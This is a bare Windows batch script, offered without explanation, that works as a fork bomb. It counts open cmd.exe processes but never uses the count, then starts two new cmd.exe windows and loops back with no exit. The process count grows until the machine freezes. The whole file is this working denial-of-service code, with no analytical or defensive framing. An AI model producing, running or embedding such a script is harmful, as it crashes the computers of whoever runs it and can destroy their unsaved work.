@echo off
:loop
rem Count the number of currently open cmd.exe processes
set count=0
for /f %%i in ('tasklist ^| find /i "cmd.exe"') do (
    set /a count+=1
)

rem Open two new instances of cmd.exe
start cmd.exe
start cmd.exe

rem Call the loop again
goto loop
